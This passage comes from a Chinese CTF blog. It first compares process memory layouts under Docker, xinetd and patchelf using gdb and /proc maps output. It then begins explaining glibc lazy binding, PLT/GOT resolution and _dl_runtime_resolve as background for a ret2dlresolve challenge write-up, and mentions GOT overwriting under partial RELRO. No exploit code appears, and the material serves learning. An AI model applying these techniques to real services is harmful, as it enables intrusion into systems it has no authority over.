    0x7fc2b83be000     0x7fc2b83c0000 rw-p     2000  39000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fff90916000     0x7fff90938000 rw-p    22000      0 <span class="o">[</span>stack]
    0x7fff90968000     0x7fff9096c000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7fff9096c000     0x7fff9096e000 r-xp     2000      0 <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="可以看到mmap获得的空间现在变成了在libc上方原因暂时未知">   可以看到，mmap获得的空间现在变成了在libc上方，原因暂时未知。</h5> <h3 id="xinted转发会话时启动的进程">xinted转发会话时启动的进程</h3> <h5 id="之前docker内可行的exp在访问端口本地docker或者服务器远程上的题目时发现无法打通于是猜测是xinted转发的进程内存布局不同">   之前docker内可行的exp,在访问端口(本地docker或者服务器远程)上的题目时,发现无法打通,于是猜测是xinted转发的进程内存布局不同<br/></h5> <h5 id="在正式查看之前先做准备工作第一步先修改以下xinted的设置">   在正式查看之前,先做准备工作,第一步先修改以下xinted的设置</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service ctf
<span class="o">{</span>
    disable <span class="o">=</span> no
    socket_type <span class="o">=</span> stream
    protocol    <span class="o">=</span> tcp
    <span class="nb">wait</span>        <span class="o">=</span> no
    user        <span class="o">=</span> root
    <span class="nb">type</span>        <span class="o">=</span> UNLISTED
    port        <span class="o">=</span> 9999
    <span class="nb">bind</span>        <span class="o">=</span> 0.0.0.0
    <span class="c"># 设置xinetd连接启动后的服务程序</span>
    server      <span class="o">=</span> /usr/sbin/chroot
    <span class="c"># 设置chroot的相关参数</span>
    server_args <span class="o">=</span> <span class="nt">--userspec</span><span class="o">=</span>0000:0000 /home/ctf ./attachment <span class="c"># &lt;---- 这里改为以root用户执行文件,否则之后看maps没权限</span>
    banner_fail <span class="o">=</span> /etc/banner_fail
    <span class="c"># safety options</span>
    per_source	<span class="o">=</span> 10 <span class="c"># the maximum instances of this service per source IP address</span>
    rlimit_cpu	<span class="o">=</span> 20 <span class="c"># the maximum number of CPU seconds that the service may use</span>
    <span class="c">#rlimit_as  = 1024M # the Address Space resource limit for the service</span>
    <span class="c">#access_times = 2:00-9:00 12:00-24:00</span>
<span class="o">}</span>

</code></pre></div></div> <h5 id="然后构建镜像">   然后构建镜像</h5> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker build <span class="nt">-t</span> boss <span class="nb">.</span>
<span class="nv">$ </span>docker run <span class="nt">-p</span> 8000:9999 boss
<span class="c"># 切换一个shell</span>
<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> &lt;容器名&gt; /bin/bash
&lt;容器名&gt;/home/ctf<span class="nv">$ </span>apt-get <span class="nb">install </span>gdb
</code></pre></div></div> <h5 id="再打开一个shellnc-localhost-8000现在docker容器中就存在一个attachment的进程由xindted转发-此时先找到pid">   再打开一个shell,<code class="language-plaintext highlighter-rouge">nc localhost 8000</code>,现在docker容器中就存在一个attachment的进程,由xindted转发<br/>    此时先找到pid</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   4364  3164 ?        Ss   00:16   0:00 /bin/bash /docker-entrypoint.sh
root        19  0.0  0.0   2792  1036 ?        S    00:16   0:00 <span class="nb">sleep </span>infinity
root        20  0.0  0.0  13784  2392 ?        Ss   00:16   0:00 /usr/sbin/xinetd <span class="nt">-pidfile</span> /run/xinetd.pid <span class="nt">-stayalive</span> <span class="nt">-inetd_c</span>
root        21  0.0  0.0   4628  3720 pts/0    Ss   00:16   0:00 /bin/bash
root        29  0.0  0.0   2652   264 ?        Ss   00:17   0:00 ./attachment <span class="c"># &lt;--- 在这里</span>
root        30  0.0  0.0   7064  1552 pts/0    R+   00:17   0:00 ps aux
</code></pre></div></div> <h5 id="现在调试这个pid">   现在调试这个pid</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span>gdb <span class="nt">--pi</span><span class="o">=</span>29
<span class="o">(</span>gdb<span class="o">)</span> x/10gx 0x56341ccb5000 + 0x40a0
0x56341ccb90a0: 0x00007ff9322bc000      0x0000000000000000
0x56341ccb90b0: 0x0000000000000000      0x0000000000000000
0x56341ccb90c0: 0x0000000000000000      0x0000000000000000
0x56341ccb90d0: 0x0000000000000000      0x0000000000000000
0x56341ccb90e0: 0x0000000000000000      0x0000000000000000
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;容器名&gt;/home/ctf<span class="nv">$ </span><span class="nb">cat</span> /proc/29/maps
56341ccb5000-56341ccb6000 r--p 00000000 08:30 20412                      /home/ctf/attachment
56341ccb6000-56341ccb7000 r-xp 00001000 08:30 20412                      /home/ctf/attachment
56341ccb7000-56341ccb8000 r--p 00002000 08:30 20412                      /home/ctf/attachment
56341ccb8000-56341ccb9000 r--p 00002000 08:30 20412                      /home/ctf/attachment
56341ccb9000-56341ccba000 rw-p 00003000 08:30 20412                      /home/ctf/attachment
7ff9322bc000-7ff9322c1000 rw-p 00000000 00:00 0 <span class="c"># &lt;------- 这里</span>
7ff9322c1000-7ff9322e9000 r--p 00000000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9322e9000-7ff93247e000 r-xp 00028000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff93247e000-7ff9324d6000 r--p 001bd000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324d6000-7ff9324d7000 <span class="nt">---p</span> 00215000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324d7000-7ff9324db000 r--p 00215000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324db000-7ff9324dd000 rw-p 00219000 08:30 19693                      /home/ctf/lib/x86_64-linux-gnu/libc.so.6
7ff9324dd000-7ff9324ec000 rw-p 00000000 00:00 0 
7ff9324ec000-7ff9324ee000 r--p 00000000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff9324ee000-7ff932518000 r-xp 00002000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932518000-7ff932523000 r--p 0002c000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932524000-7ff932526000 r--p 00037000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ff932526000-7ff932528000 rw-p 00039000 08:30 19672                      /home/ctf/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffdbc5a8000-7ffdbc5c9000 rw-p 00000000 00:00 0                          <span class="o">[</span>stack]
7ffdbc5ec000-7ffdbc5f0000 r--p 00000000 00:00 0                          <span class="o">[</span>vvar]
7ffdbc5f0000-7ffdbc5f2000 r-xp 00000000 00:00 0                          <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="结果发现这个xinted转发的进程的内存布局和patchelf的似乎一致mmap的位置都在libc上面其他长度也是对应的这个结果就有点子幽默了本来就是patchelf无法得到完全一致的内存布局所以给了dockerfile结果现在xinted转发的进程内存布局不一样反倒和patchelf的结果正好对上了">   结果发现这个xinted转发的进程的内存布局和patchelf的似乎一致,mmap的位置都在libc上面,其他长度也是对应的.<br/>   这个结果就有点子幽默了,本来就是patchelf无法得到完全一致的内存布局所以给了Dockerfile,结果现在xinted转发的进程内存布局不一样,反倒和patchelf的结果正好对上了😅😅😅</h5> <h3 id="end">END</h3>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[前情提要]]></summary></entry><entry><title type="html">glibc动态链接重定位 + CNSS2024 pwn boss wp</title><link href="https://leakbox258.github.io/blog/2024/ret2dlresolve/" rel="alternate" type="text/html" title="glibc动态链接重定位 + CNSS2024 pwn boss wp"/><published>2024-10-02T00:00:00+00:00</published><updated>2024-10-02T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/ret2dlresolve</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/ret2dlresolve/"><![CDATA[<h4 id="参考资料">参考资料：</h4> <p>实例文件为boss题的attachment，见github<br/> https://zhuanlan.zhihu.com/p/37572651<br/> https://ctf-wiki.org/executable/elf/structure/basic-info/<br/> https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ <br/> https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc <br/></p> <h3 id="动态链接程序的装载">动态链接程序的装载</h3> <h5 id="当程序使用动态链接时才会存在延迟绑定技术一个动态链接的程序除了要将程序本身加载进内存之外还需要加载对应使用的libc这一步由ld动态链接器实现由于动态链接信息与程序的形成和加载由莫大关系所以在linux系统下这些信息必须在二进制文件中明确写出而不是存放在某个path中">   当程序使用动态链接时，才会存在延迟绑定技术。<br/>   一个动态链接的程序，除了要将程序本身加载进内存之外，还需要加载对应使用的libc，这一步由ld动态链接器实现。<br/>   由于动态链接信息与程序的形成和加载由莫大关系，所以在linux系统下，这些信息必须在二进制文件中明确写出，而不是存放在某个PATH中。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>首先，我们来关注一下链接视图。

文件开始处是 ELF 头部（ ELF Header），它给出了整个文件的组织情况。

如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。

节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。

节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。

</code></pre></div></div> <p><strong><em>来自CTFwiki</em></strong></p> <h5 id="这里谈及的是linking-view链接视图也就是程序没有加载时的结构header-table中有关链接的信息在装载时被读取作为构建executing-view执行视图的依据如下ida也读取到了这些信息">   这里谈及的是Linking View（链接视图），也就是程序没有加载时的结构，Header table中有关链接的信息在装载时被读取，作为构建Executing View（执行视图）的依据。如下，IDA也读取到了这些信息。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000
LOAD:0000000000000000 <span class="p">;</span> File Name   : C:<span class="se">\U</span>sers<span class="se">\3</span>0336<span class="se">\D</span>esktop<span class="se">\p</span>wn
LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="不难发现即使是在桌面中的文件ida依然可以正确读取interpreter的位置因为这些信息已经写死在二进制文件中常用的工具patchelf也是通过直接修改文件达成interpreter和libc的更换">   不难发现，即使是在桌面中的文件，IDA依然可以正确读取Interpreter的位置，因为这些信息已经写死在二进制文件中。<br/>   常用的工具<code class="language-plaintext highlighter-rouge">patchelf</code>也是通过直接修改文件达成Interpreter和libc的更换。</h5> <h3 id="延迟绑定系统">延迟绑定系统</h3> <h5 id="对于动态链接库的使用主要关注点在于外部函数的使用当程序和库被装载在内存之后text段的指令就可以通过call来实现对外部函数的调用对于内部的函数call指令相当于是push和jmp然后到达对应地址之后开始压栈执行等而call外部函数时对应地址是另外一条jmp它会跳转到该函数的plt的位置如果这个外部函数已经被调用过至少一次那么plt处第二次跳转会到达该函数的got表项的位置这个got表项又是另一个jmp指令这次终于到达了外部函数的真正地址然后开始压栈执行这是外部函数大多数情况下的调用过程">   对于动态链接库的使用，主要关注点在于外部函数的使用<br/>   当程序和库被装载在内存之后，.text段的指令就可以通过<code class="language-plaintext highlighter-rouge">call</code>来实现对外部函数的调用，对于内部的函数<code class="language-plaintext highlighter-rouge">call</code>指令相当于是<code class="language-plaintext highlighter-rouge">push</code>和<code class="language-plaintext highlighter-rouge">jmp</code>，然后到达对应地址之后开始压栈、执行等。而<code class="language-plaintext highlighter-rouge">call</code>外部函数时，对应地址是另外一条<code class="language-plaintext highlighter-rouge">jmp</code>，它会跳转到该函数的<code class="language-plaintext highlighter-rouge">plt</code>的位置。<br/>   如果这个外部函数已经被调用过至少一次，那么<code class="language-plaintext highlighter-rouge">plt</code>处第二次跳转会到达该函数的<code class="language-plaintext highlighter-rouge">got</code>表项的位置，这个<code class="language-plaintext highlighter-rouge">got</code>表项又是另一个<code class="language-plaintext highlighter-rouge">jmp</code>指令，这次终于到达了外部函数的真正地址，然后开始压栈、执行。这是外部函数大多数情况下的调用过程。<br/></h5> <h5 id="众所周知我们在打ret2libc时需要先泄露出libc中某一个函数在内存中的真实地址然后根据已知的偏移找到我们需要的东西即使是-no-pie也是一样所以说由于种种原因即使程序本身的地址可以通过静态分析获得确切地址也无法预先找到libc的加载地址那么问题来了由于text肯定是没法跟着libc加载地址一起变化的那么在使用外部函数时怎样才能保证外部函数地址的正确呢这就是第一次调用外部函数时需要解决的也就是对外部函数进行重定位-">   众所周知，我们在打<code class="language-plaintext highlighter-rouge">ret2libc</code>时，需要先泄露出libc中某一个函数在内存中的真实地址，然后根据已知的偏移找到我们需要的东西，即使是<code class="language-plaintext highlighter-rouge">-no-pie</code>也是一样。所以说由于种种原因，即使程序本身的地址可以通过静态分析获得确切地址，也无法预先找到libc的加载地址。<br/>   那么问题来了，由于<code class="language-plaintext highlighter-rouge">.text</code>肯定是没法跟着libc加载地址一起变化的，那么在使用外部函数时，怎样才能保证外部函数地址的正确呢？这就是第一次调用外部函数时需要解决的，也就是对外部函数进行重定位. <br/></h5> <h5 id="首先解决一个疑惑为什么是在第一次调用时才重定位呢实际上不一定是第一次调用才重定位也可能在main之前就被处理好了但在具体实现尤其是有大量外部函数的调用时上还是第一次调用时重定位居多很简单因为重定位是一个比较消耗时间的过程而有些函数比如异常时结束进程的exit很可能根本就用不上所以就延迟绑定lazy-load没ddl绝不干活">   首先解决一个疑惑，为什么是在第一次调用时才重定位呢？实际上，不一定是第一次调用才重定位，也可能在<code class="language-plaintext highlighter-rouge">main()</code>之前就被处理好了，但在具体实现（尤其是有大量外部函数的调用时）上，还是第一次调用时重定位居多。很简单，因为重定位是一个比较消耗时间的过程，而有些函数（比如异常时结束进程的<code class="language-plaintext highlighter-rouge">exit()</code>）很可能根本就用不上，所以就延迟绑定（lazy load），没ddl绝不干活。<br/></h5> <h5 id="由于延迟绑定的存在所以之前所说的got表那一内存页在完成所有重定位之前一直都要保持可写这就是got表篡改这一漏洞的实现逻辑既在所有重定位完成之前篡改一个或多个got表项这个办法在partial-relro和no-relro时可用在full-relro时函数被提前重定位然后内存页变成只读就没办法改了">   由于延迟绑定的存在，所以之前所说的<code class="language-plaintext highlighter-rouge">got</code>表那一内存页在完成所有重定位之前，一直都要保持可写。这就是<code class="language-plaintext highlighter-rouge">got</code>表篡改这一漏洞的实现逻辑，既在所有重定位完成之前篡改一个或多个<code class="language-plaintext highlighter-rouge">got</code>表项。这个办法在<code class="language-plaintext highlighter-rouge">partial RELRO</code>和<code class="language-plaintext highlighter-rouge">no RELRO</code>时可用，在<code class="language-plaintext highlighter-rouge">full RELRO</code>时，函数被提前重定位，然后内存页变成只读，就没办法改了。<br/></h5> <h3 id="延迟绑定-detail">延迟绑定 detail</h3> <h5 id="先来一个一个demo这个是最原始纯真的延迟绑定后面会来一个带-fcf-protectionnone的demo">   先来一个一个demo，这个是最原始纯真的延迟绑定，后面会来一个带<code class="language-plaintext highlighter-rouge">-fcf-protection=none</code>的demo。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="s">"what a day!"</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">gcc</span> <span class="n">lazy_load</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">z</span> <span class="n">lazy</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span> <span class="o">-</span><span class="n">fcf</span><span class="o">-</span><span class="n">protection</span><span class="o">=</span><span class="n">none</span> <span class="o">-</span><span class="n">o</span> <span class="n">lazy_load</span>
</code></pre></div></div> <h5 id="-在main中第一次调用puts可以看到是putsplt">    在<code class="language-plaintext highlighter-rouge">main()</code>中第一次调用<code class="language-plaintext highlighter-rouge">puts()</code>，可以看到是<code class="language-plaintext highlighter-rouge">puts@plt</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">►</span> <span class="mh">0x401140</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">puts</span><span class="err">@</span><span class="n">plt</span>                    <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="-然后进去看看">    然后进去看看</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="-再到putsgotplt看一眼这一块有些不知所云网上收集的资料倒是比较容易一致的说法是这里是存放的是putsplt--6的指令也就是又跳转回去到了下面的0x401036的位置">    再到<code class="language-plaintext highlighter-rouge">puts@got.plt</code>看一眼，这一块有些不知所云，网上收集的资料倒是比较容易，一致的说法是，这里是存放的是<code class="language-plaintext highlighter-rouge">puts@plt + 6</code>的指令，也就是又跳转回去，到了下面的<code class="language-plaintext highlighter-rouge">0x401036</code>的位置。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;:</span>     <span class="n">ss</span> <span class="n">adc</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
   <span class="mh">0x40401e</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span><span class="n">al</span>
</code></pre></div></div> <h5 id="再回来6位置push一个0x0到栈上然后又跳">   再回来，<code class="language-plaintext highlighter-rouge">+6</code>位置<code class="language-plaintext highlighter-rouge">push</code>一个<code class="language-plaintext highlighter-rouge">0x0</code>到栈上，然后又跳</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401036</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>       <span class="n">push</span>   <span class="mh">0x0</span>
   <span class="mh">0x40103b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>      <span class="n">jmp</span>    <span class="mh">0x401020</span>
</code></pre></div></div> <h5 id="不难看到这块儿正好在putsplt上具体来说是它在plt头部所以也叫plt0又向栈上push然后jmp到0x404010">   不难看到，这块儿正好在<code class="language-plaintext highlighter-rouge">puts@plt</code>上，具体来说是它在plt头部，所以也叫plt[0]<br/>   又向栈上<code class="language-plaintext highlighter-rouge">push</code>，然后<code class="language-plaintext highlighter-rouge">jmp</code>到<code class="language-plaintext highlighter-rouge">0x404010</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x401020</span><span class="o">:</span>    <span class="n">push</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404008</span>
   <span class="mh">0x401026</span><span class="o">:</span>    <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe4</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404010</span>
   <span class="mh">0x40102c</span><span class="o">:</span>    <span class="n">nop</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
   <span class="mh">0x401030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span> <span class="n">jmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x2fe2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x404018</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div> <h5 id="0x404010是一个函数的地址这个函数就是_dl_runtime_resolve用于运行时进行外部函数重定位而刚才的两次push是为该函数提供了参数第一个push的是rel_arg是一个偏移值第二个是link_map结构体">   <code class="language-plaintext highlighter-rouge">0x404010</code>是一个函数的地址，这个函数就是<code class="language-plaintext highlighter-rouge">_dl_runtime_resolve()</code>，用于运行时进行外部函数重定位，而刚才的两次<code class="language-plaintext highlighter-rouge">push</code>，是为该函数提供了参数，第一个<code class="language-plaintext highlighter-rouge">push</code>的是<code class="language-plaintext highlighter-rouge">rel_arg</code>，是一个偏移值，第二个是<code class="language-plaintext highlighter-rouge">link_map</code>结构体。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x404008</span><span class="o">:</span>       <span class="mh">0x00007ffff7ffe2e0</span>      <span class="mh">0x00007ffff7fd8d30</span> <span class="err">#</span> <span class="n">linkmap</span> <span class="err">#</span> <span class="n">_dl_runtime_resolve</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x00007ffff7fd8d30</span>
<span class="mh">0x7ffff7fd8d30</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">&gt;:</span>    <span class="mh">0xe3894853fa1e0ff3</span>      <span class="mh">0x4d252b48c0e48348</span>
<span class="mh">0x7ffff7fd8d40</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="mh">0x482404894800023f</span>      <span class="mh">0x2454894808244c89</span>
<span class="mh">0x7ffff7fd8d50</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span> <span class="mh">0x8948182474894810</span>      <span class="mh">0x282444894c20247c</span>
<span class="mh">0x7ffff7fd8d60</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span> <span class="mh">0x00eeb830244c894c</span>      <span class="mh">0x24948948d2310000</span>
<span class="mh">0x7ffff7fd8d70</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsavec</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span> <span class="mh">0x2494894800000250</span>      <span class="mh">0x2494894800000258</span>
</code></pre></div></div> <h5 id="需要注意的是无论是32还是64位都是这一套模式64位在这里不会用寄存器传递这两个参数">   需要注意的是，无论是32还是64位都是这一套模式，64位在这里不会用寄存器传递这两个参数。</h5> <h3 id="_dl_runtime_resolve如何重定位">_dl_runtime_resolve()如何重定位</h3> <h5 id="在具体讨论之前补充一些关于segment的东西">   在具体讨论之前，补充一些关于Segment的东西<br/></h5> <h5 id="dynamic存储很多关于动态链接的信息的结构体elf64_dyn结构体内包含的是信息的种类以及地址">   .dynamic，存储很多关于动态链接的信息的结构体（ELF64_Dyn），结构体内包含的是信息的种类以及地址。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Dynamic</span> <span class="n">Information</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="o">===========================================================================</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">type</span><span class="o">:</span> <span class="n">Pure</span> <span class="n">data</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="p">;</span> <span class="n">Segment</span> <span class="n">permissions</span><span class="o">:</span> <span class="n">Read</span><span class="o">/</span><span class="n">Write</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">LOAD</span>            <span class="n">segment</span> <span class="n">mempage</span> <span class="n">public</span> <span class="err">'</span><span class="n">DATA</span><span class="err">'</span> <span class="n">use64</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="n">assume</span> <span class="n">cs</span><span class="o">:</span><span class="n">LOAD</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                 <span class="p">;</span><span class="n">org</span> <span class="mf">403E20</span><span class="n">h</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span> <span class="n">_DYNAMIC</span>        <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004001</span><span class="n">A0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="o">:</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E20</span>                                         <span class="p">;</span> <span class="n">DT_NEEDED</span> <span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">401000</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Dh</span><span class="p">,</span> <span class="mi">40114</span><span class="n">Ch</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">19</span><span class="n">h</span><span class="p">,</span> <span class="mf">403E10</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_INIT_ARRAY</span>
